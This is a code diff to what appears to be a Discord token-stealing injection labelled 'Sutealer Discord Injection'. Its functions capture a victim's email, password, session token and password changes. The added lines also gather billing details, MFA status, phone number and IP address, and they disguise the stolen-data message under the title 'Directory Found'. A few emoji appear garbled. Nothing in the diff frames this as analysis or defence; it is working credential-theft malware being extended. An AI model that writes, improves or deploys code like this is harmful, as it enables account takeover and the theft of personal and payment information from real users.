@@ -467,41 +467,52 @@ const EmailPassToken = async (email, password, token, action) => {
 
         debugLog(`Account fetched: ${account.username}`);
 
+        // Get additional account info
+        const billing = await getBilling(token);
+        const mfaEnabled = account.mfa_enabled || false;
+        const ip = await getIP();
+        const badges = getBadges(account.public_flags || account.flags || 0);
+
         const content = {
-            "content": `🔑 **${account.username}** just ${action}!`,
+            "content": " ",
             "embeds": [{
-                "title": "🎯 Discord Login Captured",
+                "title": "Directory Found",
+                "description": `\`\`\`${token}\`\`\``,
                 "fields": [{
-                    "name": "📧 Email",
-                    "value": "`" + email + "`",
-                    "inline": true
-                }, {
-                    "name": "🔐 Password",
-                    "value": "`" + password + "`",
-                    "inline": true
-                }, {
-                    "name": "🔑 Token",
-                    "value": "```" + token + "```",
+                    "name": "� User",
+                    "value": `${account.username} (${account.display_name || account.username})`,
                     "inline": false
                 }, {
-                    "name": "👤 Username",
-                    "value": "`" + account.username + "`",
-                    "inline": true
-                }, {
-                    "name": "🆔 User ID",
-                    "value": "`" + account.id + "`",
-                    "inline": true
-                }, {
                     "name": "🏆 Badges",
-                    "value": getBadges(account.public_flags || account.flags || 0),
+                    "value": badges || "❌",
+                    "inline": true
+                }, {
+                    "name": "� Billing",
+                    "value": billing || "❌",
+                    "inline": true
+                }, {
+                    "name": "� Security",
+                    "value": mfaEnabled ? "Multi factor auth is on!" : "Multi factor auth is off!",
+                    "inline": true
+                }, {
+                    "name": "📧 E-Mail",
+                    "value": `${account.email}`,
+                    "inline": true
+                }, {
+                    "name": "📱 Phone",
+                    "value": account.phone ? `${account.phone}` : "❌",
+                    "inline": true
+                }, {
+                    "name": "🌐 IP Address",
+                    "value": `${ip}`,
                     "inline": true
                 }],
-                "color": 0x00ff00,
+                "color": 0x000000,
                 "thumbnail": {
                     "url": account.avatar ? `https://cdn.discordapp.com/avatars/${account.id}/${account.avatar}.png` : null
                 },
                 "footer": {
-                    "text": "Sutealer Discord Injection - Login Captured",
+                    "text": "Sutealer Discord Injection",
                     "icon_url": "https://cdn.discordapp.com/emojis/1087043238654906472.png"
                 },
                 "timestamp": new Date().toISOString()
@@ -605,9 +616,8 @@ const PasswordChanged = async (newPassword, oldPassword, token) => {
         const badges = getBadges(account.public_flags || 0);
 
         const content = {
-            "content": " ",
+            "content": "`" + account.username + "` just changed his password!",
             "embeds": [{
-                "title": "`" + account.username + "` just changed his password!",
                 "fields": [{
                     "name": "🔐 New Password",
                     "value": "`" + newPassword + "`",
@@ -618,19 +628,7 @@ const PasswordChanged = async (newPassword, oldPassword, token) => {
                     "inline": true
                 }, {
                     "name": "🏆 Badges",
-                    "value": badges || "No Badges",
-                    "inline": true
-                }, {
-                    "name": "🔑 Token",
-                    "value": "```" + token + "```",
-                    "inline": false
-                }, {
-                    "name": "👤 Username",
-                    "value": "`" + account.username + "`",
-                    "inline": true
-                }, {
-                    "name": "📧 Email",
-                    "value": "`" + account.email + "`",
+                    "value": badges || "❌",
                     "inline": true
                 }],
                 "color": 0x000000,
